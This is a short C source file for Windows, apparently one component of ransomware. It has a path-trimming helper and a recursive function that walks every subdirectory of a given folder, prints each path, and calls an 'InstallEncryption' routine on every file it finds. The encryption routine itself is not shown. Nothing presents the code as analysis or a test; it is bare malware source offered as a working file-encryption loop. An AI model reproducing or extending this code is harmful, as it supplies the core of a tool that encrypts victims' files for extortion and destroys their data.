#include <Windows.h>
#include <stdio.h>
#include "Common.h"

#define BUFFSIZE 256




BOOL EndWith(LPWSTR wBuff) {

	int sBuf = lstrlenW(wBuff);

	if (wBuff[sBuf - 3] == L'*' && wBuff[sBuf - 2] == L'.' && wBuff[sBuf - 1] == L'*') {
		wBuff[sBuf - 3] = L'\0';
		return TRUE;
	}
	
	return FALSE;
}



BOOL FetchFilesFromDirs(IN LPWSTR Dir) {

	HANDLE				hFind			= INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAW	FindFileData	= { 0 };

	WCHAR				Buff			[BUFFSIZE * 2 * sizeof(WCHAR)],
						Buff2			[BUFFSIZE * 2 * sizeof(WCHAR)],
						wcBuff			[BUFFSIZE * 2 * sizeof(WCHAR)];

	
	RtlSecureZeroMemory(&Buff			,			sizeof(Buff));
	RtlSecureZeroMemory(&Buff2			,			sizeof(Buff2));
	RtlSecureZeroMemory(&wcBuff			,			sizeof(wcBuff));
	RtlSecureZeroMemory(&FindFileData	,			sizeof(WIN32_FIND_DATAW));


	if (Dir[lstrlenW(Dir) - 1] != L'\\' && Dir[lstrlenW(Dir) - 2] != L'\\')
		wsprintf(Buff, L"%s\\*.*", Dir);
	else
		wsprintf(Buff, L"%s*.*", Dir);

	if ((hFind = FindFirstFileW(Buff, &FindFileData)) == INVALID_HANDLE_VALUE)
		return FALSE;


	

	while (TRUE) {
	
		if (!FindNextFileW(hFind, &FindFileData)) {
			break;
		}

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (lstrcmpW(FindFileData.cFileName, L"..") == 0) {
				continue;
			}
			EndWith(Buff);
			wsprintf(Buff2, L"%s%s", Buff, FindFileData.cFileName);
			wprintf(L"[DIRECTORY] %s \n", Buff2);
			FetchFilesFromDirs(Buff2);
		}
		else {
		
			EndWith(Buff);
			wsprintf(Buff2, L"%s%s", Buff, FindFileData.cFileName);
			wprintf(L"[FILE] %s \n", Buff2);
			InstallEncryption(Buff2);
		
		}
	
	}

	FindClose(hFind);
	return TRUE;
}













